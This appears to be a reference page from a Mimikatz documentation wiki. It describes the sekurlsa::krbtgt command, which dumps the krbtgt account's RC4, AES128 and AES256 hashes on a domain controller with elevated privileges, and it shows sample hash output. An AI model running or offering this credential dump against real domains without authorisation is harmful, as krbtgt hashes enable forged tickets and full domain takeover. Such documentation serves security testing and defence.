# krbtgt

`sekurlsa::krbtgt` retrieves the krbtgt RC4 (i.e. NT hash), AES128 and AES256 hashes.

{% hint style="warning" %}
This command must be run on a domain controller
{% endhint %}

{% hint style="warning" %}
This command requires elevated privileges (by previously running [`privilege::debug`](../privilege/debug.md) or by executing Mimikatz as the `NT-AUTHORITY\SYSTEM` account).
{% endhint %}

```
mimikatz # sekurlsa::krbtgt

Current krbtgt: 5 credentials
         * rc4_hmac_nt       : b5348d0a20a24a67ff544146a09cd292
         * rc4_hmac_old      : b5348d0a20a24a67ff544146a09cd292
         * rc4_md4           : b5348d0a20a24a67ff544146a09cd292
         * aes256_hmac       : 3ab45a59d37a5a647e0d7d9d942d0e8b77911cff0bd95b16e203cd9503ccdd96
         * aes128_hmac       : 3c8fc2890213fb9be3d6fb139b1be881
```
